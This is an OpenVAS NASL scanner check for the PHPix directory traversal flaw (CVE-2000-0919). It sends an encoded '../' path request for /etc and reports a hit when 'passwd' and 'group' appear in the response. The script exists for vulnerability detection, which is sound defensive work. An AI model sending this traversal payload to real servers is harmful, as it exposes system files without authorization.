# OpenVAS Vulnerability Test
# $Id: phpix.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: PHPix directory traversal vulnerability
#
# Authors:
# Zorgon <zorgon@linuxstart.com>
#
# Copyright:
# Copyright (C) 2000 Zorgon <zorgon@linuxstart.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "PHPix program allows an attacker to read arbitrary files on the remote web server,  prefixing the pathname of the file with ..%2F..%2F..

Example:
    GET /Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0

will return all the files that are nested within /etc directory.";

tag_solution = "Contact your vendor for the latest software release.";

if(description)
{
 script_id(10574);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1773);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cve_id("CVE-2000-0919");
 
 name = "PHPix directory traversal vulnerability";
 script_name(name);
 

 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2000 Zorgon <zorgon@linuxstart.com>");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
  buf = http_get(item:string("/Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0"), port:port);
  rep = http_keepalive_send_recv(port:port, data:buf);
  if("Prev 20" >< rep)
  	{
	if(("group" >< rep) && ("passwd" >< rep))
         	security_message(port);
	}
}
